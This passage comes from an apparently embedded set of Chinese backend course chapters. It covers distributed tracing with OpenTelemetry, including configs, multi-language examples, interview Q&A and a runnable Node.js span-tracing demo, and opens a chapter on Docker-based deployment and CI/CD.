把密码、Token、身份证号等敏感信息记录在 Span 属性中，追踪数据存储后存在泄露风险。

正确做法：OTel 的 Attribute 配置可自动脱敏。或手动过滤：

    // 不要这样
    span.setAttribute('password', userPassword);
    
    // 要这样
    span.setAttribute('auth_method', 'password');  // 只记方式，不记值

---

## 附录 F：主流追踪系统对比

### F.1 Jaeger vs Zipkin vs SkyWalking vs Pinpoint

| 维度 | Jaeger | Zipkin | SkyWalking | Pinpoint |
|------|--------|--------|------------|----------|
| 开源方 | Uber/CNCF | Twitter | Apache | Naver |
| 语言 | Go | Java | Java | Java |
| 埋点方式 | SDK/自动 | SDK/自动 | 字节码增强 | 字节码增强 |
| 无侵入 | 否 | 否 | 是（Java Agent） | 是（Java Agent） |
| OTel 兼容 | 是 | 是 | 是 | 否 |
| 存储 | ES/Cassandra | ES/MySQL | ES/H2/MySQL | HBase |
| UI | 瀑布图+拓扑 | 瀑布图 | 瀑布图+拓扑+监控 | 瀑布图+拓扑 |
| 生态 | CNCF 主推 | 老牌 | 国内流行 | 韩国流行 |
| 多语言 | 好 | 好 | 中（Java 最佳） | 差（Java 为主） |

选型建议：

- 新项目、多语言：Jaeger + OpenTelemetry（标准、生态好）。
- 纯 Java、要无侵入：SkyWalking（字节码增强，零代码改动）。
- 已有 Zipkin：继续用，配合 OTel。

### F.2 SkyWalking 字节码增强原理

SkyWalking 的 Java Agent 在类加载时修改字节码，自动在 HTTP、RPC、DB 等关键方法插入追踪代码。开发者无需改任何代码，启动时加 -javaagent 参数即可。

    java -javaagent:skywalking-agent.jar -Dskywalking.agent.service_name=my-service -jar app.jar

优点：零代码改动，接入成本低。
缺点：只支持 Java；字节码增强有性能开销（约 5-10%）；调试复杂。

### F.3 Pinpoint 的特点

Pinpoint 是 Naver 开源的追踪系统，也用字节码增强。特点是 UI 很炫酷（3D 拓扑图），但只支持 Java，且不兼容 OpenTelemetry。适合纯 Java 技术栈的团队。

---

## 附录 G：追踪与可观测性融合

### G.1 三支柱统一

传统上 Metrics、Logs、Traces 是三个独立系统。现代可观测性趋向统一：

- **Traces 包含 Logs**：Span 事件可以关联日志。
- **Metrics 从 Traces 生成**：从 Span 聚合 RED 指标（Rate、Error、Duration）。
- **Logs 包含 traceId**：日志关联到 Trace。

OpenTelemetry 的目标是"一套 SDK 采集三支柱，一个 Collector 处理三支柱"。

### G.2 Exemplars：Metrics 关联 Traces

Prometheus 2.26+ 支持 Exemplars——在指标中附带一个 Trace 样本。这样从指标异常可以直接跳转到 Trace。

例如，HTTP 请求延迟 histogram：

    http_request_duration_seconds_bucket{le="0.1"} 1234 # {trace_id="abc123"} 0.089

从 Grafana 可以直接点击 Exemplar 跳转到 Jaeger 查看该 Trace。这打通了"发现问题（Metrics）"和"定位问题（Traces）"的链路。

### G.3 Logs 关联 Traces

在日志中注入 traceId/spanId，就能从 Trace 跳转到日志，或从日志反查 Trace。

OTel 的 Log Appender 自动注入：

    // 日志输出
    [INFO] 2024-01-15 10:23:45 trace_id=abc123 span_id=def456 订单创建成功 orderId=789
    
    // 在 Jaeger 中点击 Span，可以看到关联的日志

这种关联让排障流程更顺畅：先看 Trace 定位到哪个服务，再看该服务的日志了解详情。

---

## 附录 H：多语言追踪实践

### H.1 Java（Spring Boot + OTel）

Spring Boot 是 Java 最流行的框架。OTel 提供了 Spring Boot Starter：

    <!-- Maven -->
    <dependency>
      <groupId>io.opentelemetry.instrumentation</groupId>
      <artifactId>opentelemetry-spring-boot-starter</artifactId>
    </dependency>

配置（application.yml）：

    otel:
      exporter:
        otlp:
          endpoint: http://collector:4317
      service:
        name: order-service
      traces:
        sampler:
          ratio: 0.1  # 10% 采样

自动追踪：HTTP、JDBC、Redis、Kafka 等。手动追踪：

    @WithSpan("create_order")
    public Order createOrder(@SpanAttribute("user_id") String userId) {
        // 业务逻辑
    }

### H.2 Go（OTel SDK）

    import (
        "go.opentelemetry.io/otel"
        "go.opentelemetry.io/otel/trace"
    )
    
    func initTracer() {
        exporter, _ := otlptrace.New(ctx, otlptracegrpc.NewClient())
        tp := sdktrace.NewTracerProvider(
            sdktrace.WithBatcher(exporter),
            sdktrace.WithSampler(sdktrace.TraceIDRatioBased(0.1)),
        )
        otel.SetTracerProvider(tp)
    }
    
    func handleOrder(ctx context.Context) {
        tracer := otel.Tracer("order-service")
        ctx, span := tracer.Start(ctx, "handle_order")
        defer span.End()
        
        // 业务逻辑
        span.SetAttributes(attribute.String("user_id", userId))
    }

Go 的好处是 ctx 传递 trace 上下文，HTTP 中间件自动注入/提取。

### H.3 Python（Flask + OTel）

    from opentelemetry import trace
    from opentelemetry.instrumentation.flask import FlaskInstrumentor
    from opentelemetry.sdk.trace import TracerProvider
    from opentelemetry.exporter.otlp.proto.grpc.trace_exporter import OTLPSpanExporter
    
    trace.set_tracer_provider(TracerProvider())
    trace.get_tracer_provider().add_span_processor(
        BatchSpanProcessor(OTLPSpanExporter(endpoint="collector:4317"))
    )
    
    app = Flask(__name__)
    FlaskInstrumentor().instrument_app(app)  # 自动追踪 Flask
    
    @app.route("/orders")
    def orders():
        tracer = trace.get_tracer(__name__)
        with tracer.start_as_current_span("query_orders"):
            # 业务逻辑
            return jsonify(orders)

### H.4 Node.js（Express + OTel）

    const { NodeSDK } = require('@opentelemetry/sdk-node');
    const { OTLPTraceExporter } = require('@opentelemetry/exporter-otlp-grpc');
    const { ExpressInstrumentation } = require('@opentelemetry/instrumentation-express');
    const { HttpInstrumentation } = require('@opentelemetry/instrumentation-http');
    
    // 必须在 require 其他模块之前启动
    const sdk = new NodeSDK({
      traceExporter: new OTLPTraceExporter({ url: 'http://collector:4317' }),
      instrumentations: [new HttpInstrumentation(), new ExpressInstrumentation()],
      serviceName: 'order-service',
    });
    sdk.start();
    
    // 之后正常使用 Express
    const express = require('express');
    const app = express();
    app.get('/orders', (req, res) => {
      const activeSpan = trace.getActiveSpan();
      activeSpan.setAttribute('user_id', req.query.userId);
      // 业务逻辑
    });

关键：OTel SDK 必须在应用代码之前 require，否则自动埋点不生效。通常用 --require 参数：

    node --require ./tracing.js app.js

---

## 附录 I：追踪系统面试深度问答

### I.1 "traceId 怎么保证全局唯一？"

答：traceId 通常是 128 位随机数（32 个十六进制字符）。碰撞概率极低（2^-128）。OTel 默认用随机生成。有些系统用"时间戳 + 机器 ID + 序列号"的 Snowflake 变种，保证递增和唯一。

### I.2 "如果一个请求经过 50 个服务，怎么保证 trace 不断？"

答：靠 Context Propagation。每个服务收到请求时，从 HTTP 头（traceparent）提取 traceId 和 parent spanId，创建自己的 Span（parent 指向上游）。调用下游时，把新的 spanId 注入到请求头。这样一环扣一环，50 个服务的 Span 都挂在一个 traceId 下。关键是要确保每个框架/库都正确处理 trace 上下文——OTel 的自动埋点库已经覆盖了主流框架。

### I.3 "追踪数据量太大怎么办？"

答：四管齐下：

1. 采样：头部 1-5% + 尾部 100% 错误。
2. 批量：SDK 批量发送，减少网络请求。
3. 异步：导出异步，不阻塞业务。
4. 降级：流量高峰时降低采样率，保系统稳定。

### I.4 "Span 的 parent 关系怎么存储？"

答：每个 Span 记录 parent_span_id。查询时按 trace_id 查出所有 Span，在内存中按 parent 关系构建树。存储用宽表（每个 Span 一行），不做嵌套存储。树的构建在查询时完成。

### I.5 "OpenTelemetry 和 Jaeger 什么关系？"

答：OTel 是"采集层"标准——定义如何埋点、采样、导出。Jaeger 是"后端"——存储和查询 Trace。OTel 采集的数据导出到 Jaeger 展示。它们是互补关系，不是竞争。类似 Prometheus（采集）+ Grafana（展示）。

### I.6 "尾部采样怎么实现？"

答：在 OTel Collector 中配置 tail_sampling processor：

1. Collector 收到所有 Span，按 trace_id 缓存。
2. 等待一定时间（如 10 秒）或 Span 数量达到阈值。
3. 对完整 Trace 评估策略（错误？慢？正常？）。
4. 决定采样的 Trace 导出，不采样的丢弃。

挑战：需要大量内存缓存近期 Trace。可以按 trace_id hash 分片到多个 Collector 实例，降低单节点压力。

---

## 附录 J：链路追踪未来趋势

### J.1 OpenTelemetry 统一生态

OTel 正在统一可观测性采集层。未来趋势：

- Metrics、Logs、Traces 三支柱统一 SDK。
- 标准化语义约定（Semantic Conventions）。
- 更多语言和框架的自动埋点支持。
- Collector 生态丰富（更多 processor/exporter）。

### J.2 eBPF 无侵入追踪

eBPF（Extended Berkeley Packet Filter）在内核态拦截系统调用，实现零代码改动的追踪。无需 SDK、无需字节码增强，内核级自动追踪。

优点：真正零侵入、支持所有语言、性能开销极低。
缺点：只能追踪系统调用层面（HTTP、TCP），业务逻辑层面需要配合。

代表项目：Pixie、Inspektor。

### J.3 AI 辅助根因分析

用 ML/AI 分析 Trace 数据，自动发现异常模式：

- 异常检测：自动发现延迟突增的 Span。
- 根因推荐：基于历史故障，推荐可能的根因。
- 拓扑异常：自动发现服务依赖变化。

代表项目：Dynatrace Davis、Datadog Watchdog。

### J.4 Continuous Profiling + Tracing

把性能剖析（Profiling）和追踪结合，不仅知道"哪个请求慢"，还能知道"哪行代码慢"。

代表项目：Pyroscope、Parca。它们能在 Trace 级别关联 CPU Profile，看到每个 Span 的 CPU 火焰图。

---

## 附录 K：Span 类型与语义约定详解

OpenTelemetry 定义了标准 Span 类型和语义约定（Semantic Conventions），让不同语言、不同框架的追踪数据有一致的格式。

### K.1 Span 类型

| 类型 | 含义 | 触发场景 |
|------|------|----------|
| SERVER | 服务端处理请求 | HTTP Handler、RPC Handler |
| CLIENT | 客户端发起请求 | HTTP Client、RPC Client |
| INTERNAL | 内部逻辑 | 业务函数调用 |
| PRODUCER | 消息生产者 | 发送 MQ 消息 |
| CONSUMER | 消息消费者 | 处理 MQ 消息 |

类型决定了 Span 在调用链中的角色。SERVER 和 CLIENT 配对使用——CLIENT Span 是调用方，SERVER Span 是被调用方。

### K.2 标准属性（Semantic Conventions）

OTel 定义了大量标准属性名，确保跨语言一致：

**HTTP 相关**：

| 属性 | 含义 | 示例 |
|------|------|------|
| http.method | HTTP 方法 | GET、POST |
| http.url | 完整 URL | http://api.example.com/users |
| http.status_code | 响应码 | 200、404、500 |
| http.route | 路由模板 | /users/:id |
| http.request.content_length | 请求体大小 | 1024 |

**数据库相关**：

| 属性 | 含义 | 示例 |
|------|------|------|
| db.system | 数据库类型 | mysql、postgresql、redis |
| db.statement | SQL 语句 | SELECT * FROM users WHERE id = ? |
| db.operation | 操作类型 | SELECT、INSERT |
| db.instance | 数据库实例 | mydb |

**错误相关**：

| 属性 | 含义 | 示例 |
|------|------|------|
| error | 是否出错 | true |
| exception.type | 异常类型 | java.lang.NullPointerException |
| exception.message | 异常消息 | Cannot invoke method on null |
| exception.stacktrace | 堆栈 | 完整堆栈字符串 |

用标准属性的好处：不同语言的追踪数据格式一致，可以在同一平台统一分析。

### K.3 Span 事件与链接

**事件**：Span 上可以记录时间点事件，如日志、异常。

    span.addEvent('cache_miss', { key: 'user:123', timestamp: Date.now() });
    span.recordException(new Error('connection timeout'));

事件有独立时间戳，在 Span 瀑布图中显示为节点。

**链接**：一个 Span 可以 link 到其他 Span。用于批量处理场景——一个 Consumer Span 处理了多条消息，每条消息有自己的 Producer Span。通过 link 关联。

    span.addLink({ spanId: producerSpan1.spanId, traceId: producerSpan1.traceId });
    span.addLink({ spanId: producerSpan2.spanId, traceId: producerSpan2.traceId });

---

## 附录 L：分布式追踪常见误区

### L.1 "追踪只是排查问题的工具"

追踪不仅是排障工具，还是：

1. **性能基线**：长期追踪数据反映系统性能趋势。
2. **依赖地图**：自动发现服务依赖关系。
3. **SLI 来源**：从 Span 聚合延迟、错误率指标。
4. **测试验证**：测试环境跑 Trace，验证调用链正确性。

### L.2 "用了 OTel 就万事大吉"

OTel 只是采集层。要让它发挥作用还需：

1. 配置合理的采样策略（不是默认就好的）。
2. 部署 Collector 处理数据。
3. 选合适的后端（Jaeger/ES/Cassandra）。
4. 在关键业务节点手动埋点。
5. 培养团队用 Trace 排障的习惯。

### L.3 "Span 越多越好"

Span 太多导致：

1. 性能开销大（每个 Span 都有序列化、传输成本）。
2. 瀑布图太复杂，反而看不清。
3. 存储成本高。

建议：一次请求 5-15 个 Span。跨进程调用必须有 Span，内部函数按重要性选择性埋点。

### L.4 "追踪能替代日志"

不能。追踪看"链路"，日志看"细节"。

- Trace 告诉你"请求经过哪些服务、每步耗时"。
- Log 告诉你"每一步内部的详细变量、执行分支"。

两者互补。最佳实践是日志中注入 traceId，实现关联。

---

## 附录 M：追踪系统术语速查表

| 术语 | 含义 |
|------|------|
| Trace | 一次请求的完整调用链 |
| Span | 调用链中的一个节点 |
| SpanContext | Span 的上下文（traceId、spanId、flags） |
| Parent Span | 当前 Span 的父 Span |
| Child Span | 由当前 Span 创建的子 Span |
| Root Span | 调用链的根 Span（没有 parent） |
| traceId | 全链路唯一标识 |
| spanId | Span 唯一标识 |
| Sampling | 采样，决定是否记录 Span |
| Head Sampling | 头部采样，入口决定 |
| Tail Sampling | 尾部采样，完成后决定 |
| Propagation | 上下文传播，跨服务传递 traceId |
| Baggage | 跨服务传递的业务键值对 |
| Instrumentation | 埋点，在代码中插入追踪逻辑 |
| Auto-instrumentation | 自动埋点，无需改代码 |
| Collector | 收集器，接收和处理遥测数据 |
| OTLP | OpenTelemetry Protocol，标准传输协议 |
| RED method | Rate、Error、Duration 分析法 |
| Exemplar | 指标中附带的 Trace 样本 |

掌握这些术语，阅读追踪相关文档和论文会更顺畅。追踪是可观测性的重要支柱，它让分布式系统的"黑盒"变透明——每一次调用都有据可查。

---

## 附录 N：OpenTelemetry Collector 配置实战

Collector 是追踪系统的枢纽，正确的配置至关重要。

### N.1 基础配置

    receivers:
      otlp:
        protocols:
          grpc:
            endpoint: 0.0.0.0:4317
          http:
            endpoint: 0.0.0.0:4318
    
    processors:
      batch:
        timeout: 5s
        send_batch_size: 512
      memory_limiter:
        check_interval: 1s
        limit_mib: 512
      tail_sampling:
        decision_wait: 10s
        policies:
          - name: errors
            type: status_code
            status_code: {status_codes: [ERROR]}
          - name: slow
            type: latency
            latency: {threshold_ms: 1000}
          - name: sample_10pct
            type: probabilistic
            probabilistic: {sampling_percentage: 10}
    
    exporters:
      jaeger:
        endpoint: jaeger:14250
        tls:
          insecure: true
      logging:
        loglevel: debug
    
    service:
      pipelines:
        traces:
          receivers: [otlp]
          processors: [memory_limiter, batch, tail_sampling]
          exporters: [jaeger]

### N.2 处理器详解

**batch**：批量处理器，把小 Span 合并成大批次发送，减少网络请求。默认 5 秒或 512 条发送一次。

**memory_limiter**：内存限制器，防止 OOM。当内存超限时拒绝新数据（背压），让 SDK 缓冲。

**tail_sampling**：尾部采样处理器。等待 Trace 完成后决策。上面的配置：错误 100% 采、慢请求（>1s）100% 采、其余 10% 采。

**filter**：过滤处理器，按条件丢弃 Span。如过滤健康检查请求：

    filter:
      traces:
        span:
          - 'attributes["http.route"] == "/health"'

**attributes**：属性处理器，修改/删除/添加属性。如脱敏：

    attributes:
      actions:
        - key: http.request.header.authorization
          action: delete

### N.3 多路导出

同一份数据可导出到多个后端：

    exporters:
      jaeger:
        endpoint: jaeger:14250
      otlp/tempo:
        endpoint: tempo:4317
      logging: {}
    
    service:
      pipelines:
        traces:
          receivers: [otlp]
          processors: [batch]
          exporters: [jaeger, otlp/tempo, logging]

这样可以从 Jaeger 和 Tempo 同时查看 Trace，做平滑迁移。

---

## 附录 O：分布式追踪最佳实践 Checklist

1. 入口服务创建 Root Span，下游服务从请求头提取 parent。
2. Span 名用模板（如 GET /users/:id），不要用动态 URL。
3. 关键属性必须记录：http.method、http.status_code、error、user_id。
4. 异常要 recordException + setStatus(ERROR)。
5. Span 必须在 finally 中 end()。
6. 异步场景要传播 Context。
7. 消息队列场景用 PRODUCER/CONSUMER Span + link。
8. 采样策略：头部 + 尾部组合。
9. Collector 独立部署，水平扩展。
10. 存储保留 3-7 天，用 ILM 自动清理。
11. 日志注入 traceId，实现关联。
12. 敏感信息脱敏，不记录明文。
13. 定期 Review Span 数量和开销。
14. 关键业务节点手动埋点。
15. 培养团队用 Trace 排障的习惯。

---

## 附录 P：追踪系统演进路线图

从零到成熟，追踪系统的建设可分五个阶段：

### 阶段一：无追踪（0-1）

- 没有追踪系统，排障靠日志。
- 问题：跨服务问题难定位，靠人在多台机器上 grep 日志。
- 目标：先有日志规范化，引入 traceId 概念。

### 阶段二：单服务追踪（1-N）

- 在核心服务接入 OTel SDK。
- 只追踪单服务的内部调用，不跨服务。
- 目标：熟悉 OTel API，验证采集流程。

### 阶段三：跨服务追踪（N-N²）

- 所有微服务接入 OTel。
- traceId 跨服务传播，形成完整调用链。
- 部署 Jaeger + ES 做后端。
- 目标：能看到完整 Trace 瀑布图。

### 阶段四：智能采样 + 告警（成熟）

- 引入尾部采样，100% 采错误和慢请求。
- 从 Trace 聚合 RED 指标，接入 Grafana。
- 告警基于追踪数据（如 P99 延迟超阈值）。
- 目标：追踪数据驱动 SRE 实践。

### 阶段五：AI 辅助 + 全链路可观测（领先）

- AI 自动发现异常 Trace，推荐根因。
- Metrics/Logs/Traces 完全融合。
- eBPF 补充内核级追踪。
- 目标：可观测性自动化，"系统自己发现问题并定位"。

每个阶段解决不同的痛点，不要跳步。阶段一的公司直接上阶段四是会失败的——基础设施和团队习惯都需要逐步建设。

追踪系统是可观测性的"第三支柱"，和日志、监控一起，让分布式系统从"黑盒"变成"白盒"。在微服务时代，没有追踪系统的系统就像在黑暗中开车——你知道在前进，但不知道前面有什么。`,
    code: `// ============================================================
// 分布式链路追踪 —— 可运行示例
// 实现 Tracer/Span/TraceContext + 模拟下单调用链 + 找最慢环节
// ============================================================

const crypto = require('crypto');

// ---------- 1. 生成唯一 ID ----------
function genId(prefix) {
  return prefix + '_' + crypto.randomBytes(6).toString('hex');
}

// ---------- 2. SpanContext（跨服务传播的上下文） ----------
class SpanContext {
  constructor(traceId, spanId, parentSpanId = null) {
    this.traceId = traceId;
    this.spanId = spanId;
    this.parentSpanId = parentSpanId;
  }
  // 模拟注入 HTTP Header（W3C traceparent 格式）
  toHeaders() {
    return {
      'traceparent': '00-' + this.traceId + '-' + this.spanId + '-01'
    };
  }
  // 模拟从 HTTP Header 提取
  static fromHeaders(headers) {
    const tp = headers['traceparent'];
    if (!tp) return null;
    const parts = tp.split('-');
    return { traceId: parts[1], spanId: parts[2] };
  }
}

// ---------- 3. Span（一次操作） ----------
class Span {
  constructor(tracer, operationName, context, kind = 'INTERNAL') {
    this.tracer = tracer;
    this.operationName = operationName;
    this.context = context;
    this.kind = kind;  // SERVER / CLIENT / INTERNAL
    this.startTime = null;
    this.endTime = null;
    this.tags = {};
    this.events = [];
    this.status = 'OK';
    this.error = null;
  }
  start() { this.startTime = Date.now(); return this; }
  end() {
    this.endTime = Date.now();
    this.tracer.record(this);
    return this;
  }
  setTag(k, v) { this.tags[k] = v; return this; }
  addEvent(name, attrs = {}) {
    this.events.push({ timestamp: Date.now(), name, attrs });
    return this;
  }
  setError(err) {
    this.status = 'ERROR';
    this.error = err;
    return this;
  }
  get duration() { return this.endTime - this.startTime; }
}

// ---------- 4. Tracer（创建 span、管理 trace） ----------
class Tracer {
  constructor(serviceName) {
    this.serviceName = serviceName;
    this.spans = [];  // 当前 trace 的所有 span
    this.currentSpan = null;
  }

  // 创建 root span（链路入口）
  startRootSpan(operationName, kind = 'SERVER') {
    const traceId = crypto.randomBytes(16).toString('hex');  // 32 hex
    const spanId = crypto.randomBytes(8).toString('hex');    // 16 hex
    const ctx = new SpanContext(traceId, spanId, null);
    const span = new Span(this, operationName, ctx, kind);
    this.currentSpan = span;
    return span.start();
  }

  // 创建 child span（继承父 context）
  startChildSpan(operationName, kind = 'INTERNAL') {
    const parent = this.currentSpan;
    if (!parent) throw new Error('无父 span，请用 startRootSpan');
    const spanId = crypto.randomBytes(8).toString('hex');
    const ctx = new SpanContext(parent.context.traceId, spanId, parent.context.spanId);
    const span = new Span(this, operationName, ctx, kind);
    return span.start();
  }

  // 模拟跨服务调用：注入 context 到 "HTTP Header" 供下游提取
  injectContext() {
    return this.currentSpan.context.toHeaders();
  }

  record(span) { this.spans.push(span); }
  get traceId() { return this.spans[0]?.context.traceId; }
}

// ---------- 5. 模拟一次下单请求经过多个服务 ----------
// 网关 → 用户服务 → 商品服务 → 订单服务 → 库存服务 → 支付服务
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function gatewayService() {
  const tracer = new Tracer('gateway');
  const span = tracer.startRootSpan('gateway.handle', 'SERVER');
  span.setTag('http.method', 'POST').setTag('http.url', '/api/orders');
  span.addEvent('request_received');

  await sleep(5);  // 网关处理
  await userService(tracer);
  await productService(tracer);
  await orderService(tracer);

  span.setTag('http.status_code', 200);
  span.end();
  return tracer;
}

async function userService(parentTracer) {
  // 模拟下游服务接收请求：从 header 提取 context
  const headers = parentTracer.injectContext();
  const extracted = SpanContext.fromHeaders(headers);
  const tracer = new Tracer('user-service');
  // 下游创建 server span，parent 是上游传来的 spanId
  const ctx = new SpanContext(extracted.traceId, crypto.randomBytes(8).toString('hex'), extracted.spanId);
  const span = new Span(tracer, 'userservice.auth', ctx, 'SERVER');
  span.start().setTag('rpc.system', 'http');
  await sleep(8);
  span.end();
  parentTracer.record(span);  // 归到同一 trace
}

async function productService(parentTracer) {
  const headers = parentTracer.injectContext();
  const extracted = SpanContext.fromHeaders(headers);
  const tracer = new Tracer('product-service');
  const ctx = new SpanContext(extracted.traceId, crypto.randomBytes(8).toString('hex'), extracted.spanId);
  const span = new Span(tracer, 'productservice.get', ctx, 'SERVER').start();
  span.setTag('product.id', 'SKU001');
  await sleep(15);
  span.end();
  parentTracer.record(span);
}

async function orderService(parentTracer) {
  const headers = parentTracer.injectContext();
  const extracted = SpanContext.fromHeaders(headers);
  const tracer = new Tracer('order-service');
  const ctx = new SpanContext(extracted.traceId, crypto.randomBytes(8).toString('hex'), extracted.spanId);
  const span = new Span(tracer, 'orderservice.create', ctx, 'SERVER').start();
  span.addEvent('order_validation_start');

  await sleep(5);  // 校验
  await inventoryService(tracer, parentTracer);
  await paymentService(tracer, parentTracer);

  span.addEvent('order_created', { orderId: 'ORD123' });
  span.end();
  parentTracer.record(span);
}

async function inventoryService(childTracer, rootTracer) {
  const span = childTracer.startChildSpan('inventoryservice.deduct', 'CLIENT').start();
  span.setTag('db.system', 'mysql').setTag('db.operation', 'UPDATE');
  await sleep(170);  // 慢 SQL！
  span.end();
  rootTracer.record(span);
}

async function paymentService(childTracer, rootTracer) {
  const span = childTracer.startChildSpan('paymentservice.pay', 'CLIENT').start();
  span.setTag('payment.channel', 'alipay');
  await sleep(670);  // 第三方支付网关慢！
  span.end();
  rootTracer.record(span);
}

// ---------- 6. 渲染调用链树 ----------
function renderTree(spans) {
  const byId = new Map(spans.map(s => [s.context.spanId, s]));
  const children = new Map();
  let root = null;
  for (const s of spans) {
    if (!s.context.parentSpanId) { root = s; continue; }
    if (!children.has(s.context.parentSpanId)) children.set(s.context.parentSpanId, []);
    children.get(s.context.parentSpanId).push(s);
  }
  const lines = [];
  function walk(span, depth) {
    const indent = '  '.repeat(depth);
    const dur = span.duration;
    const errMark = span.status === 'ERROR' ? ' [ERROR]' : '';
    const slow = dur > 100 ? ' ← 慢!' : '';
    lines.push(indent + '├─ ' + span.operationName + ' (' + span.kind + ') ' + dur + 'ms' + errMark + slow);
    for (const c of (children.get(span.context.spanId) || [])) walk(c, depth + 1);
  }
  walk(root, 0);
  return lines.join('\\n');
}

// ---------- 7. 运行演示 ----------
(async () => {
  console.log('===== 模拟下单请求调用链 =====');
  const tracer = await gatewayService();

  console.log('\\nTrace ID:', tracer.traceId);
  console.log('Span 总数:', tracer.spans.length);

  console.log('\\n--- 调用链树 ---');
  console.log(renderTree(tracer.spans));

  // 找最慢环节
  const sorted = [...tracer.spans].sort((a, b) => b.duration - a.duration);
  console.log('\\n--- 耗时 Top 3 ---');
  sorted.slice(0, 3).forEach((s, i) => {
    console.log((i + 1) + '. ' + s.operationName + ' - ' + s.duration + 'ms' +
      (s.tags['db.system'] ? ' [DB: ' + s.tags['db.system'] + ']' : '') +
      (s.tags['payment.channel'] ? ' [支付: ' + s.tags['payment.channel'] + ']' : ''));
  });

  // 性能瓶颈分析
  const slowest = sorted[0];
  console.log('\\n--- 瓶颈分析 ---');
  console.log('最慢环节: ' + slowest.operationName + ' (' + slowest.duration + 'ms)');
  if (slowest.tags['payment.channel']) {
    console.log('根因: 第三方支付网关慢，建议异步化或加超时降级');
  } else if (slowest.tags['db.system']) {
    console.log('根因: 数据库慢查询，建议加索引或优化 SQL');
  }

  // 模拟 traceId 关联日志查询
  console.log('\\n--- traceId 关联日志查询 ---');
  console.log('在日志系统搜索 traceId=' + tracer.traceId + ' 可获取本次请求的所有日志');
  console.log('在 metrics 系统按 service 聚合 span 可得 RED 指标');

  console.log('\\n===== 演示结束 =====');
})();
`,
  },

  // =========================================================
  // 第四章：部署与 CI/CD
  // =========================================================
  {
    id: "backend-deploy",
    group: "分布式与工程化",
    icon: "🚀",
    title: "部署与 CI/CD",
    content: `## 部署与 CI/CD

**部署（Deployment）** 是把代码"搬"到服务器上运行的过程；**CI/CD** 是让这个过程自动化的工程实践。从最早的 SSH 上传 jar 包，到如今的 Kubernetes + GitOps，部署方式经历了巨大演进。部署质量直接决定了"凌晨 3 点要不要被叫醒"——好的部署流程让你安心睡觉，差的部署流程让你天天救火。

本章从部署演进史讲起，深入 Docker 容器化、Kubernetes、CI/CD 流水线、Git 工作流、部署策略、回滚机制、配置与制品管理。

### 一、部署演进史

#### 1.1 物理机时代

最早的应用直接部署在物理服务器上。一台机器跑一个应用，手动 SSH 上传文件、重启服务。

问题：
- **资源利用率低**：一个应用占一台机器，CPU 经常闲置。
- **隔离差**：多应用共存的依赖冲突。
- **扩缩容慢**：买机器、装系统要几天。
- **环境不一致**：开发、测试、生产环境差异大，"在我机器上能跑"。

#### 1.2 虚拟机时代

用 VMware/KVM 把一台物理机虚拟成多台虚拟机，每台 VM 跑一个应用。

改进：资源利用率提升、隔离变好、可用模板快速创建 VM。
遗留：VM 仍较重（每个 VM 一个完整 OS，几 GB），启动慢（分钟级），还是"一台一应用"思维。

#### 1.3 容器时代

Docker 把应用和依赖打包成镜像，在宿主机上以进程隔离运行。

改进：
- **轻量**：容器共享宿主内核，无需 Guest OS，镜像几 MB-几百 MB。
- **启动快**：秒级（vs VM 分钟级）。
- **环境一致**：镜像打包所有依赖，"一次构建，到处运行"。
- **密度高**：一台机器可跑几十上百个容器。

容器成为云原生的基础设施。

#### 1.4 Kubernetes 时代

单机 Docker 用 Docker Compose 够了，但生产有几十上百台机器，需要集群管理：调度、扩缩容、自愈、滚动更新、服务发现。Kubernetes（K8s）成为容器编排事实标准。

K8s 提供：
- 声明式 API：描述"期望状态"，K8s 让实际状态趋近期望。
- 自愈：容器挂了自动重启，节点挂了自动迁移。
- 滚动更新与回滚。
- 服务发现与负载均衡。
- 自动扩缩容（HPA）。

#### 1.5 Serverless 时代

进一步抽象，开发者只管写函数代码，平台负责部署、扩缩容、运维。如 AWS Lambda、Knitive。

优点：免运维、按需付费、自动扩缩容到零。
缺点：冷启动延迟、有状态难处理、厂商锁定、调试困难。适合事件驱动、短任务场景。

---

### 二、容器化 Docker 详解

#### 2.1 镜像与容器

- **镜像（Image）**：只读模板，包含应用代码 + 运行时 + 依赖。类似 OOP 的"类"。
- **容器（Container）**：镜像的运行实例，可读写。类似 OOP 的"对象"。
- **仓库（Registry）**：存储和分发镜像，如 Docker Hub、Harbor。

镜像是分层的（Layer），每条 Dockerfile 指令产生一层。多层共享：基础层（如 alpine）被多个镜像复用，节省存储和拉取时间。

#### 2.2 镜像分层（UnionFS）

Docker 镜像基于联合文件系统（UnionFS），如 overlay2。每层是只读的，容器运行时在最上层加一个可读写层。

\`\`\`
镜像层（只读）
├── Layer 1: alpine base
├── Layer 2: install jdk
├── Layer 3: copy app.jar
└── 容器可写层（运行时产生）
\`\`\`

分层的好处：
- **复用**：多个镜像共享基础层。
- **缓存**：构建时未变更的层用缓存，加速构建。
- **增量传输**：拉取镜像只下载缺失的层。

#### 2.3 容器隔离（namespaces + cgroups）

容器隔离靠 Linux 内核特性：

**Namespaces（命名空间）**：隔离视图。
- PID：容器内进程号独立（容器内 PID 1）。
- NET：独立网络栈（独立 IP、端口、路由）。
- MNT：独立文件系统挂载点。
- UTS：独立 hostname。
- IPC：独立消息队列。
- USER：UID 映射（容器内 root 是宿主普通用户）。

**Cgroups（控制组）**：限制资源。
- CPU 限额：限制容器用多少 CPU。
- 内存限额：限制内存，超限 OOM Kill。
- 磁盘 IO 限额。

Namespaces 隔离"看到什么"，Cgroups 限制"用多少"。两者组合实现容器隔离。注意：容器不是虚拟机——容器共享内核，内核漏洞影响所有容器。强隔离场景仍需 VM。

#### 2.4 Dockerfile 最佳实践

**多阶段构建**：用一个大镜像编译，再把产物复制到小镜像运行，最终镜像不含编译工具。

\`\`\`dockerfile
# 阶段 1：构建（用 maven 镜像编译）
FROM maven:3.9-eclipse-temurin-17 AS builder
WORKDIR /app
COPY pom.xml .
RUN mvn dependency:go-offline          # 先下依赖（利用层缓存）
COPY src ./src
RUN mvn package -DskipTests

# 阶段 2：运行（用小镜像）
FROM eclipse-temurin:17-jre-alpine
COPY --from=builder /app/target/app.jar /app/app.jar
EXPOSE 8080
ENTRYPOINT ["java", "-jar", "/app/app.jar"]
\`\`\`

最终镜像只有 JRE + jar，几百 MB，而非完整的 maven + JDK + 源码（几个 GB）。

**最小基础镜像**：用 alpine（5MB）或 distroless（无 shell，更安全）而非 ubuntu（70MB）。

**.dockerignore**：排除不需要的文件，避免打进镜像或破坏缓存。

\`\`\`
.git
node_modules
*.log
target
.env
\`\`\`

